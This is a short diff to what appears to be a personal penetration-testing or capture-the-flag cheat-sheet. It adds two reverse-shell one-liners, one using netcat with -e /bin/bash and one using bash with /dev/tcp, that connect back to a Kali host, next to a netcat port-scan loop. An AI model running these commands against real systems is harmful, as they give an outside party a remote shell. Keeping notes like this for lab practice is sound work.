@@ -861,6 +861,10 @@ In linux, run the following NC command
 	iii.) to check which ports open assuming you cannot NETCAT in a host
 	for i in $(seq 1 1000); do nc -zv -w 1 172.16.50.1 $i; done
 
+Connect to KALI from Linux remote:
+nc 192.168.45.238 1708 -e /bin/bash
+/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.238/1708 0>&1'
+
 L.) Find command: 
 i.)find flag.txt in all directory remove all errors 
 	Linux:
